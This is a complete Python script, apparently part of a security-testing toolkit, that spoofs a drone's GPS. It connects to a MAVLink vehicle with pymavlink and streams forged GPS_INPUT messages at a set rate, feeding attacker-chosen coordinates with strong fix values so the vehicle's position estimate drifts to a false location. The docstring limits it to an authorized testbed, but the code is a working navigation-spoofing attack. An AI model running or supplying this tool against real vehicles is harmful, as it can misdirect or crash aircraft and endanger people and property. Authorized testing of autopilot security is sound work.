#!/usr/bin/env python3
"""GPS_INPUT spoofer (tool_id=gps_input_spoof).

AUTHORIZED TESTBED ONLY. Streams GPS_INPUT at --rate Hz with attacker lat/lon so the
EKF is fed a false position. Observe telemetry drift as the success oracle.
"""
import argparse, json, sys, time


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--conn", required=True)
    ap.add_argument("--lat", type=float, required=True)
    ap.add_argument("--lon", type=float, required=True)
    ap.add_argument("--alt", type=float, default=50.0)
    ap.add_argument("--rate", type=float, default=5.0)
    ap.add_argument("--duration", type=float, default=10.0)
    a = ap.parse_args()
    try:
        from pymavlink import mavutil
    except ImportError:
        print(json.dumps({"ok": False, "error": "pymavlink not installed"}))
        return 3
    m = mavutil.mavlink_connection(a.conn)
    m.wait_heartbeat(timeout=10)
    n, end, period = 0, time.time() + a.duration, 1.0 / max(a.rate, 0.1)
    while time.time() < end:
        m.mav.gps_input_send(
            int(time.time() * 1e6), 0, 0, 0, 0, 3,
            int(a.lat * 1e7), int(a.lon * 1e7), a.alt,
            1.0, 1.0, 0, 0, 0, 0.5, 0.5, 0.5, 12)
        n += 1
        time.sleep(period)
    print(json.dumps({"ok": True, "sent": n, "lat": a.lat, "lon": a.lon, "rate": a.rate}))
    return 0


if __name__ == "__main__":
    sys.exit(main())
